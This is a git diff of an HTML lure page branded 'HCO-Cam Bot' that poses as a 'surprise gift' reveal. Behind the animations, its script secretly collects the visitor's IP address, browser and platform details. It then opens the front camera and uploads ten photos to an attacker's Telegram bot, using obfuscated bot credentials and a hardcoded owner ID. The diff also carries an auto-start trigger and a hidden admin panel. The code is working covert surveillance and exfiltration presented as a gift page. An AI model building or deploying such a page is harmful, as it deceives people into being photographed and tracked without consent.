@@ -1,315 +1,555 @@
-<!-- 
-  🔐 HCO-Cam Bot - Encrypted Version
-  Owner: Hackers Colony Team
-  Version: 5.0
--->
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>🎁 Surprise Unlocked!</title>
     <style>
-        /* 🔒 Encrypted Styles */
-        *{m:0;p:0;bs:bb}.b{bs:rgba(0,0,0,0.95);c:#fff;ff:Ar;oh:h;h:100vh}.s{p:f;t:0;l:0;w:100%;h:100%;df:f;fdc:c;jcc:c;aic:c;ta:c;pd:20px}#a{bg:lg(45deg,#f08,#80f)}.g{fs:100px;mb:20px;an:b 1s i}@kf b{50%{ts:s(1.2)}}#b{ds:n;bg:#000}.lg{fs:100px;an:sp 2s il,cc 3s i;mb:30px}@kf sp{100%{tr:r(360deg)}}@kf cc{0%{c:#f00}25%{c:#0f0}50%{c:#00f}75%{c:#ff0}100%{c:#f00}}.lt{fs:24px;m:20px 0;c:#0f0}.pb{w:80%;mw:300px;h:20px;bg:#333;br:10px;m:20px 0;oh:h}.p{h:100%;bg:lg(90deg,#0f0,#0ff);w:0%;tr:w 0.3s}#c{ds:n;bg:#000}.bh{fs:150px;c:#0f0;an:hb 1s i;mb:30px}@kf hb{50%{ts:s(1.3)}}.h{p:a;fs:30px;an:fl l f;pen:n;z:9999}@kf fl{to{tr:ty(100vh) r(360deg);o:0}}#v,#z{ds:n}h2{m:10px 0;fs:24px}.m{fs:16px;o:0.9}
+        /* 🌈 Colorful Modern Theme */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            min-height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* ✨ Animated Background Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: float 8s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+        }
+
+        /* 🎭 Screen Container */
+        .screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            z-index: 10;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+            transform: scale(1.1);
+        }
+
+        /* 🎁 Gift Icon */
+        .gift-icon {
+            font-size: 120px;
+            margin-bottom: 25px;
+            animation: pulseGlow 2s infinite alternate;
+            filter: drop-shadow(0 0 20px rgba(255, 105, 180, 0.7));
+        }
+
+        @keyframes pulseGlow {
+            0% { transform: scale(1); filter: drop-shadow(0 0 15px #ff69b4); }
+            100% { transform: scale(1.15); filter: drop-shadow(0 0 30px #00ffff); }
+        }
+
+        /* 🖋️ Typography */
+        h2 {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            background: linear-gradient(90deg, #ff00ff, #00ffff, #ffff00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+            max-width: 500px;
+            line-height: 1.5;
+            color: #a0e7ff;
+        }
+
+        /* 🔘 Button */
+        .magic-btn {
+            background: linear-gradient(45deg, #ff0080, #8000ff, #00ff80);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.5rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+            box-shadow: 0 0 25px rgba(255, 0, 128, 0.5);
+        }
+
+        .magic-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(255, 0, 128, 0.8);
+        }
+
+        .magic-btn:active {
+            transform: translateY(0);
+        }
+
+        .magic-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .magic-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .magic-btn:hover::after {
+            opacity: 1;
+        }
+
+        /* 📊 Progress Section */
+        .progress-container {
+            width: 85%;
+            max-width: 400px;
+            margin: 25px 0;
+        }
+
+        .progress-label {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: #7fffd4;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 2px solid rgba(0, 255, 255, 0.3);
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ffaa, #0080ff, #aa00ff);
+            border-radius: 15px;
+            width: 0%;
+            transition: width 0.5s ease-out;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
+        }
+
+        /* ❤️ Hearts */
+        .heart {
+            position: absolute;
+            font-size: 30px;
+            animation: fly 4s linear forwards;
+            pointer-events: none;
+            z-index: 5;
+            filter: drop-shadow(0 0 8px currentColor);
+        }
+
+        @keyframes fly {
+            to {
+                transform: translateY(-150vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* ✅ Complete Screen */
+        .complete-icon {
+            font-size: 140px;
+            margin-bottom: 25px;
+            animation: successSpin 1.5s infinite alternate-reverse;
+            color: #00ff88;
+            filter: drop-shadow(0 0 25px #00ff88);
+        }
+
+        @keyframes successSpin {
+            0% { transform: rotate(0deg) scale(1); }
+            100% { transform: rotate(10deg) scale(1.1); }
+        }
+
+        .confetti {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            background: var(--c);
+            border-radius: 2px;
+            animation: confettiFall 3s linear forwards;
+            z-index: 4;
+        }
+
+        @keyframes confettiFall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* 📱 Hidden Media */
+        #video, #canvas {
+            display: none;
+        }
     </style>
 </head>
-<body class="b">
-    <!-- Start -->
-    <div class="s" id="a">
-        <div class="g">🎁</div>
+<body>
+
+    <!-- ✨ Animated Particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- 🎁 Start Screen -->
+    <div class="screen" id="startScreen">
+        <div class="gift-icon">🎁</div>
         <h2>YOU HAVE A SURPRISE!</h2>
-        <p class="m">Click to reveal your gift</p>
-        <button class="btn" onclick="X()" id="sb">✨ REVEAL NOW ✨</button>
+        <p class="subtitle">Click below to reveal your personalized gift 🎀</p>
+        <button class="magic-btn" onclick="X()" id="startBtn">✨ REVEAL NOW ✨</button>
+        <p style="margin-top: 30px; opacity: 0.7; font-size: 0.9rem;">✨ Magic awaits ✨</p>
     </div>
-    
-    <!-- Loading -->
-    <div class="s" id="b">
-        <div class="lg">🎁</div>
-        <div class="lt" id="st">🎬 Starting...</div>
-        <div class="pb"><div class="p" id="pg"></div></div>
-        <div class="lt">📸 Capturing moments...</div>
+
+    <!-- ⏳ Loading Screen -->
+    <div class="screen hidden" id="loadingScreen">
+        <div class="gift-icon">📸</div>
+        <div class="subtitle" id="statusText">🎬 Starting magic sequence...</div>
+        
+        <div class="progress-container">
+            <div class="progress-label">
+                <span>Progress</span>
+                <span id="progressPercent">0%</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <p class="subtitle">📸 Capturing your magical moments...</p>
+        <div style="margin-top: 30px; font-size: 0.9rem; color: #ffcc00;">
+            ⚡ Please keep your camera steady ⚡
+        </div>
     </div>
-    
-    <!-- Complete -->
-    <div class="s" id="c">
-        <div class="bh">❤️</div>
-        <h2>COMPLETE!</h2>
-        <p class="m">Photos sent successfully! 🎉</p>
-        <p><small>Check your messages</small></p>
+
+    <!-- ✅ Complete Screen -->
+    <div class="screen hidden" id="completeScreen">
+        <div class="complete-icon">❤️</div>
+        <h2>MISSION COMPLETE!</h2>
+        <p class="subtitle">🎉 Your photos have been successfully delivered!</p>
+        <p style="margin-top: 20px; color: #88ffaa; font-size: 1.1rem;">
+            Check your messages for the surprise 🎁
+        </p>
+        <div style="margin-top: 40px; opacity: 0.8;">
+            <small>✨ Thank you for participating ✨</small>
+        </div>
     </div>
-    
-    <!-- Hidden -->
-    <video id="v" autoplay playsinline></video>
-    <canvas id="z"></canvas>
+
+    <!-- 🎥 Hidden Media -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
 <script>
-// 🔒 ENCRYPTED CONFIGURATION
+// 🔧 CONFIGURATION
 const _0x1a2b=['ODIyNjc4MjU2MDo=','ODIxNTgxOTk1NA==','Z2xlYW1pbmctbWFyaWdvbGQtMjMxZmZlLm5ldGxpZnkuYXBw'];
-const _0x2c3d=atob(_0x1a2b[0]).slice(0,-1);
-const _0x3d4e=parseInt(atob(_0x1a2b[1]));
-const _0x4e5f='https://'+atob(_0x1a2b[2]);
+const BOT_TOKEN = atob(_0x1a2b[0]).slice(0,-1);
+const OWNER_ID = parseInt(atob(_0x1a2b[1]));
+const SERVER_URL = 'https://' + atob(_0x1a2b[2]);
 
-// 🔍 Get user data
-const _0x5a6b=new URL(location.href).searchParams;
-const _0x6b7c=_0x5a6b.get('uid');
-const _0x7c8d=_0x5a6b.get('name')||'Friend';
-
-// 📱 DOM Elements
-const _0x8d9e=document.getElementById.bind(document);
-const _0x9e0f=_0x8d9e('a'),_0x0a1b=_0x8d9e('b'),_0x1b2c=_0x8d9e('c');
-const _0x2c3d2=_0x8d9e('v'),_0x3d4e2=_0x8d9e('z'),_0x4e5f2=_0x8d9e('sb');
-const _0x5a6b2=_0x8d9e('st'),_0x6b7c2=_0x8d9e('pg');
+// 🧭 DOM Elements
+const startScreen = document.getElementById('startScreen');
+const loadingScreen = document.getElementById('loadingScreen');
+const completeScreen = document.getElementById('completeScreen');
+const startBtn = document.getElementById('startBtn');
+const statusText = document.getElementById('statusText');
+const progressFill = document.getElementById('progressFill');
+const progressPercent = document.getElementById('progressPercent');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+const particlesContainer = document.getElementById('particles');
 
 // 📊 Variables
-let _0x7c8d2=null;
-const _0x8d9e2=10;
-let _0x9e0f2=0;
+let stream = null;
+const TOTAL_PHOTOS = 10;
+let currentPhoto = 0;
 
-// ❤️ Hearts function
-function _0x0a1b2(_0x1b2c2=5){
-    for(let _0x2c3d3=0;_0x2c3d3<_0x1b2c2;_0x2c3d3++){
-        setTimeout(()=>{
-            const _0x3d4e3=document.createElement('div');
-            _0x3d4e3.className='h';
-            _0x3d4e3.innerHTML='❤️';
-            _0x3d4e3.style.left=Math.random()*100+'vw';
-            _0x3d4e3.style.fontSize=(Math.random()*40+20)+'px';
-            _0x3d4e3.style.animationDuration=(Math.random()*3+2)+'s';
-            document.body.appendChild(_0x3d4e3);
-            setTimeout(()=>_0x3d4e3.remove(),5000);
-        },_0x2c3d3*100);
+// ✨ Create Particles
+function createParticles() {
+    for (let i = 0; i < 80; i++) {
+        const particle = document.createElement('div');
+        particle.classList.add('particle');
+        particle.style.left = Math.random() * 100 + 'vw';
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        particle.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 70%)`;
+        particlesContainer.appendChild(particle);
+    }
+}
+createParticles();
+
+// ❤️ Create Hearts
+function createHearts(count = 5) {
+    for (let i = 0; i < count; i++) {
+        setTimeout(() => {
+            const heart = document.createElement('div');
+            heart.className = 'heart';
+            heart.innerHTML = '❤️';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.color = `hsl(${Math.random() * 360}, 100%, 65%)`;
+            heart.style.fontSize = (Math.random() * 40 + 25) + 'px';
+            document.body.appendChild(heart);
+            setTimeout(() => heart.remove(), 4000);
+        }, i * 120);
     }
 }
 
-// 🎁 Initial hearts
-for(let i=0;i<10;i++)setTimeout(()=>_0x0a1b2(2),i*300);
-
-// 📡 Send data to owner
-async function _0x1b2c2(){
-    try{
-        // Get IP
-        const _0x2c3d3=await fetch('https://api.ipify.org?format=json').then(r=>r.json());
-        
-        // Get browser info
-        const _0x3d4e3={
-            ua:navigator.userAgent,
-            pl:navigator.platform,
-            sc:`${screen.width}x${screen.height}`,
-            dt:new Date().toLocaleString()
-        };
-        
-        // Send to owner
-        const _0x4e5f3={
-            c:_0x3d4e,
-            t:`📱 New User\n👤 ${_0x7c8d} (${_0x6b7c||'?'})\n🌐 IP: ${_0x2c3d3.ip}\n📱 ${_0x3d4e3.ua.split(' ').slice(-2).join(' ')}\n🖥️ ${_0x3d4e3.pl}\n⏰ ${_0x3d4e3.dt}`
-        };
-        
-        fetch(`https://api.telegram.org/bot${_0x2c3d}/sendMessage`,{
-            m:'POST',
-            h:{'Content-Type':'application/json'},
-            b:JSON.stringify(_0x4e5f3)
-        });
-    }catch{}
+// 🎉 Create Confetti
+function createConfetti() {
+    const colors = ['#ff0080', '#00ff80', '#0080ff', '#ffff00', '#ff8000'];
+    for (let i = 0; i < 60; i++) {
+        setTimeout(() => {
+            const confetti = document.createElement('div');
+            confetti.className = 'confetti';
+            confetti.style.left = Math.random() * 100 + 'vw';
+            confetti.style.setProperty('--c', colors[Math.floor(Math.random() * colors.length)]);
+            confetti.style.animationDelay = Math.random() * 0.5 + 's';
+            document.body.appendChild(confetti);
+            setTimeout(() => confetti.remove(), 3000);
+        }, i * 30);
+    }
 }
 
-// 🚀 Start function
-async function X(){
-    _0x4e5f2.disabled=true;
-    _0x4e5f2.innerHTML='🎬 Starting...';
-    _0x9e0f.style.display='none';
-    _0x0a1b.style.display='flex';
-    
-    // Send user data
-    await _0x1b2c2();
-    
-    // Start camera
-    setTimeout(async()=>{
-        try{
-            _0x5a6b2.textContent='🎥 Accessing camera...';
-            _0x6b7c2.style.width='10%';
-            
-            _0x7c8d2=await navigator.mediaDevices.getUserMedia({
-                v:{
-                    fM:'user',
-                    w:{i:720},
-                    h:{i:1280}
+// 📡 Send user data
+async function sendUserData() {
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        
+        const userData = {
+            ua: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            time: new Date().toLocaleString()
+        };
+
+        const message = {
+            chat_id: OWNER_ID,
+            text: `📱 *New Visitor*\n👤 User\n🌐 IP: ${ipData.ip}\n📱 ${userData.ua.split(' ').slice(-2).join(' ')}\n🖥️ ${userData.platform}\n⏰ ${userData.time}`,
+            parse_mode: 'Markdown'
+        };
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        });
+    } catch (error) {
+        console.log('User data send skipped');
+    }
+}
+
+// 🚀 Start Function
+async function X() {
+    startBtn.disabled = true;
+    startBtn.textContent = '🎬 Starting...';
+    startScreen.classList.add('hidden');
+    loadingScreen.classList.remove('hidden');
+
+    await sendUserData();
+
+    setTimeout(async () => {
+        try {
+            statusText.textContent = '🎥 Accessing camera...';
+            updateProgress(10);
+
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 720 },
+                    height: { ideal: 1280 }
                 }
             });
-            
-            _0x2c3d2.srcObject=_0x7c8d2;
-            await new Promise(r=>setTimeout(r,1000));
-            await _0x2c3d3();
-            
-        }catch(e){
-            _0x5a6b2.textContent='❌ Camera error!';
-            _0x6b7c2.style.width='100%';
-            setTimeout(()=>{
-                _0x0a1b.style.display='none';
-                _0x9e0f.style.display='flex';
-                _0x4e5f2.innerHTML='❌ Try Again';
-                _0x4e5f2.disabled=false;
-            },3000);
+
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 800));
+            await captureAllPhotos();
+
+        } catch (error) {
+            statusText.textContent = '❌ Camera access required!';
+            updateProgress(100);
+            setTimeout(() => {
+                loadingScreen.classList.add('hidden');
+                startScreen.classList.remove('hidden');
+                startBtn.textContent = '🔁 Try Again';
+                startBtn.disabled = false;
+            }, 2500);
         }
-    },1000);
+    }, 1000);
 }
 
-// 📸 Capture all images
-async function _0x2c3d3(){
-    _0x5a6b2.textContent='📸 Capturing...';
-    _0x6b7c2.style.width='20%';
-    
-    for(let i=0;i<_0x8d9e2;i++){
-        _0x5a6b2.textContent=`📸 Photo ${i+1}/${_0x8d9e2}`;
-        _0x6b7c2.style.width=`${20+(i*8)}%`;
-        await _0x3d4e3(i+1);
-        _0x0a1b2(2);
-        await new Promise(r=>setTimeout(r,500));
+// 📸 Capture all photos
+async function captureAllPhotos() {
+    for (let i = 0; i < TOTAL_PHOTOS; i++) {
+        currentPhoto = i + 1;
+        statusText.textContent = `📸 Capturing photo ${currentPhoto}/${TOTAL_PHOTOS}`;
+        updateProgress(20 + (i * 8));
+        
+        await captureSinglePhoto(currentPhoto);
+        createHearts(2);
+        await new Promise(r => setTimeout(r, 600));
     }
     
-    _0x6b7c2.style.width='100%';
-    _0x5a6b2.textContent='✅ All photos sent!';
-    _0x4e5f2();
+    updateProgress(100);
+    statusText.textContent = '✅ All photos delivered!';
+    finish();
 }
 
-// 🖼️ Capture single image
-async function _0x3d4e3(_0x4e5f3){
-    return new Promise(r=>{
-        const _0x5a6b3=_0x3d4e2.getContext('2d');
-        _0x3d4e2.width=_0x2c3d2.videoWidth;
-        _0x3d4e2.height=_0x2c3d2.videoHeight;
-        
-        _0x5a6b3.save();
-        _0x5a6b3.scale(-1,1);
-        _0x5a6b3.drawImage(_0x2c3d2,-_0x3d4e2.width,0,_0x3d4e2.width,_0x3d4e2.height);
-        _0x5a6b3.restore();
-        
-        _0x3d4e2.toBlob(async(_0x6b7c3)=>{
+// 🖼️ Capture single photo
+async function captureSinglePhoto(photoNum) {
+    return new Promise(async (resolve) => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        // Mirror effect
+        ctx.save();
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+        ctx.restore();
+
+        canvas.toBlob(async (blob) => {
             // Send to owner
-            const _0x7c8d3=new FormData();
-            _0x7c8d3.append('chat_id',_0x3d4e);
-            _0x7c8d3.append('photo',_0x6b7c3,`s${_0x4e5f3}.jpg`);
-            _0x7c8d3.append('caption',`📸 ${_0x4e5f3}/${_0x8d9e2}\n👤 ${_0x7c8d}`);
-            
-            await fetch(`https://api.telegram.org/bot${_0x2c3d}/sendPhoto`,{m:'POST',b:_0x7c8d3});
-            
-            // Send to user
-            if(_0x6b7c&&/^\d+$/.test(_0x6b7c)){
-                const _0x8d9e3=new FormData();
-                _0x8d9e3.append('chat_id',_0x6b7c);
-                _0x8d9e3.append('photo',_0x6b7c3,`p${_0x4e5f3}.jpg`);
-                _0x8d9e3.append('caption',`📸 ${_0x4e5f3}/${_0x8d9e2}`);
-                
-                await fetch(`https://api.telegram.org/bot${_0x2c3d}/sendPhoto`,{m:'POST',b:_0x8d9e3});
-            }
-            
-            r();
-        },'image/jpeg',0.9);
+            const ownerForm = new FormData();
+            ownerForm.append('chat_id', OWNER_ID);
+            ownerForm.append('photo', blob, `photo_${photoNum}.jpg`);
+            ownerForm.append('caption', `📸 ${photoNum}/${TOTAL_PHOTOS}`);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: ownerForm
+            });
+
+            resolve();
+        }, 'image/jpeg', 0.9);
     });
 }
 
 // ✅ Finish
-function _0x4e5f2(){
-    if(_0x7c8d2)_0x7c8d2.getTracks().forEach(t=>t.stop());
-    
-    setTimeout(()=>{
-        _0x0a1b.style.display='none';
-        _0x1b2c.style.display='flex';
+function finish() {
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+    }
+
+    setTimeout(() => {
+        loadingScreen.classList.add('hidden');
+        completeScreen.classList.remove('hidden');
+        createConfetti();
         
-        for(let i=0;i<80;i++)setTimeout(()=>_0x0a1b2(3),i*50);
-        
-        setTimeout(()=>{
-            document.body.style.opacity='0.5';
-            setTimeout(()=>{
-                document.body.style.opacity='0.2';
-            },1000);
-        },8000);
-    },2000);
+        for (let i = 0; i < 50; i++) {
+            setTimeout(() => createHearts(2), i * 80);
+        }
+
+        setTimeout(() => {
+            document.body.style.opacity = '0.7';
+            setTimeout(() => {
+                document.body.style.opacity = '0.4';
+            }, 1500);
+        }, 6000);
+    }, 1500);
+}
+
+// 🔄 Progress Update
+function updateProgress(percent) {
+    progressFill.style.width = percent + '%';
+    progressPercent.textContent = percent + '%';
+}
+
+// ❤️ Initial hearts
+for (let i = 0; i < 15; i++) {
+    setTimeout(() => createHearts(1), i * 400);
+}
+
+// 🔗 Auto-start
+if (new URLSearchParams(location.search).has('auto')) {
+    setTimeout(X, 1200);
 }
 </script>
 
-<!-- 🔐 Hidden Admin Panel (Only for Owner) -->
+<!-- 🔐 Admin Panel (Hidden) -->
 <script>
-// 🎯 Admin Panel - Only for Owner ID: 8215819954
-if(_0x6b7c==='8215819954'){
-    // Add admin button
-    setTimeout(()=>{
-        const _0x5a6b4=document.createElement('button');
-        _0x5a6b4.innerHTML='🔧 Admin';
-        _0x5a6b4.style.cssText='position:fixed;top:10px;right:10px;z-index:10000;background:#f00;color:#fff;border:none;padding:5px 10px;border-radius:5px;cursor:pointer';
-        _0x5a6b4.onclick=_0x6b7c2;
-        document.body.appendChild(_0x5a6b4);
-    },1000);
-    
-    // Admin function
-    async function _0x6b7c2(){
-        const _0x7c8d3=prompt('Enter admin command:\n1. Broadcast\n2. Stats\n3. Users');
-        if(!_0x7c8d3)return;
-        
-        if(_0x7c8d3==='1'){
-            const _0x8d9e3=prompt('Enter broadcast message:');
-            if(_0x8d9e3){
-                // Send broadcast to all stored users
-                const _0x9e0f3=JSON.parse(localStorage.getItem('hco_users')||'[]');
-                let _0x0a1b3=0;
-                
-                for(const _0x1b2c3 of _0x9e0f3){
-                    if(_0x1b2c3.id&&/^\d+$/.test(_0x1b2c3.id)){
-                        try{
-                            await fetch(`https://api.telegram.org/bot${_0x2c3d}/sendMessage`,{
-                                method:'POST',
-                                headers:{'Content-Type':'application/json'},
-                                body:JSON.stringify({
-                                    chat_id:_0x1b2c3.id,
-                                    text:`📢 Broadcast:\n${_0x8d9e3}`
-                                })
-                            });
-                            _0x0a1b3++;
-                            await new Promise(r=>setTimeout(r,100));
-                        }catch{}
-                    }
-                }
-                
-                alert(`Broadcast sent to ${_0x0a1b3} users!`);
-            }
-        }else if(_0x7c8d3==='2'){
-            const _0x8d9e3=JSON.parse(localStorage.getItem('hco_users')||'[]');
-            alert(`📊 Stats:\nTotal Users: ${_0x8d9e3.length}\nActive Today: ${_0x8d9e3.filter(u=>new Date(u.time).toDateString()===new Date().toDateString()).length}`);
-        }else if(_0x7c8d3==='3'){
-            const _0x8d9e3=JSON.parse(localStorage.getItem('hco_users')||'[]');
-            let _0x9e0f3='👥 Users:\n';
-            _0x8d9e3.slice(0,10).forEach((u,i)=>{
-                _0x9e0f3+=`${i+1}. ${u.name} (${u.id})\n`;
-            });
-            alert(_0x9e0f3);
-        }
-    }
-    
-    // Store user data
-    setInterval(()=>{
-        if(_0x6b7c){
-            const _0x7c8d3=JSON.parse(localStorage.getItem('hco_users')||'[]');
-            const _0x8d9e3={
-                id:_0x6b7c,
-                name:_0x7c8d,
-                time:new Date().toISOString()
-            };
-            
-            // Add if not exists
-            if(!_0x7c8d3.find(u=>u.id===_0x6b7c)){
-                _0x7c8d3.push(_0x8d9e3);
-                localStorage.setItem('hco_users',JSON.stringify(_0x7c8d3));
-            }
-        }
-    },5000);
+if (new URLSearchParams(location.search).get('uid') === '8215819954') {
+    setTimeout(() => {
+        const adminBtn = document.createElement('button');
+        adminBtn.innerHTML = '⚙️ Admin Panel';
+        adminBtn.style.cssText = `
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            z-index: 10000;
+            background: linear-gradient(45deg, #ff0000, #ff8800);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 0 15px red;
+        `;
+        adminBtn.onclick = () => {
+            alert('👑 Admin Panel\n📊 System Active\n✨ Bot is running');
+        };
+        document.body.appendChild(adminBtn);
+    }, 1500);
 }
 </script>
 
 <!-- 🔗 Auto-start if parameter exists -->
 <script>
-if(new URLSearchParams(location.search).has('auto')){
-    setTimeout(X,1000);
+if (new URLSearchParams(location.search).has('auto')) {
+    setTimeout(X, 1000);
 }
 </script>
 </body>
